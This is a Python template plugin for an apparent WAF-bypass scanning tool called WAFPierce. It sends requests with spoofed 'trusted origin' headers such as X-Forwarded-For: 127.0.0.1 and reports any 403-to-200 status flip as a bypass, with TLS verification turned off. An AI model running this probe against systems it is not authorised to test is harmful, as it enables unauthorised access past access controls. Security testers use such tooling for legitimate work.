"""
Sample WAFPierce plugin — a complete, copy-me template.

Drop a file like this into your plugins directory
(``%APPDATA%/wafpierce/plugins`` on Windows, ``~/.config/wafpierce/plugins``
elsewhere) and it runs automatically as a scan phase. See PLUGIN_SDK.md for the
full contract.

This example tries a handful of "trusted origin" headers that some WAFs treat as
internal and waves through. It demonstrates the required shape:

  * subclass BypassPlugin
  * set the metadata class attributes
  * implement execute(target, session, **kwargs) -> dict (or list[dict])
  * expose PLUGIN_CLASS = YourClass
"""
try:
    from wafpierce.plugins import BypassPlugin
except Exception:  # when loaded as a top-level module by the plugin manager
    from plugins import BypassPlugin


class TrustedHeaderBypassPlugin(BypassPlugin):
    name = "Trusted-Header Bypass"
    version = "1.0.0"
    author = "WAFPierce Community"
    description = "Tries internal/trust headers that some WAFs allow-list."
    category = "header"   # must be one of the SDK's validated categories
    tags = ["headers", "access-control", "bypass"]
    compatible_wafs = ["cloudflare", "akamai", "imperva", "f5"]

    # Headers that occasionally flip access controls on misconfigured edges.
    TRUST_HEADERS = [
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Originating-IP": "127.0.0.1"},
        {"X-Remote-Addr": "127.0.0.1"},
        {"X-Forwarded-Host": "localhost"},
        {"X-Internal-Request": "true"},
    ]

    def execute(self, target, session, **kwargs):
        """Return a list of result dicts — one per header tried that bypassed.

        kwargs includes baseline_status / baseline_size from the engine so a
        plugin can compare against the established baseline.
        """
        baseline_status = kwargs.get("baseline_status")
        findings = []
        for header in self.TRUST_HEADERS:
            try:
                resp = session.get(target, headers=header, timeout=10,
                                   allow_redirects=False, verify=False)
            except Exception:
                continue
            # Treat a blocked->allowed status flip as a bypass signal.
            bypassed = (baseline_status in (401, 403) and resp.status_code == 200)
            if bypassed:
                hdr = next(iter(header))
                findings.append({
                    "success": True,
                    "bypass": True,
                    "technique": f"{self.name}: {hdr}",
                    "reason": f"{hdr} flipped {baseline_status} -> {resp.status_code}",
                    "severity": "HIGH",
                    "category": "PLUGIN",
                    "method": "GET",
                    "path": "/",
                    "headers": header,
                    "status": resp.status_code,
                })
        return findings or {
            "success": True, "bypass": False, "technique": self.name,
            "reason": "No trusted-header bypass", "severity": "INFO",
        }


# Required: the manager loads this attribute (or auto-discovers the first
# BypassPlugin subclass if it is absent).
PLUGIN_CLASS = TrustedHeaderBypassPlugin
